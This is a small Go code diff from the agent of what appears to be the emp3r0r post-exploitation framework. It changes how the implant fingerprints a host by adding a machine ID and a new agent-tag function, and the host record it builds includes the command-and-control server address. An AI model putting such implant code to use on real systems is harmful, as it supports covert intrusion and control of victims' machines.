@@ -29,11 +29,11 @@ func GatherSystemDetails() *def.Emp3r0rAgent {
 	hostname, err := os.Hostname()
 	if err != nil {
 		logging.Printf("Gethostname: %v", err)
-		hostname = "unknown_host"
+		hostname = "no_name"
 	}
-	// read productInfo
-	// Minimal: skip ghw.Product
-	info.Product = nil
+
+	// Init machine ID for use in key gen and agent tag
+	common.RuntimeConfig.MachineID = util.GetMachineID()
 
 	info.CWD, err = os.Getwd()
 	if err != nil {
@@ -41,7 +41,7 @@ func GatherSystemDetails() *def.Emp3r0rAgent {
 		info.CWD = "."
 	}
 
-	common.RuntimeConfig.AgentTag = util.GetHostID(info.Product, common.RuntimeConfig.AgentUUID)
+	common.RuntimeConfig.AgentTag = util.GenAgentTag(common.RuntimeConfig.AgentUUID)
 	info.Tag = common.RuntimeConfig.AgentTag // use hostid
 	info.UUID = common.RuntimeConfig.AgentUUID
 	info.C2Host = common.RuntimeConfig.CCAddress
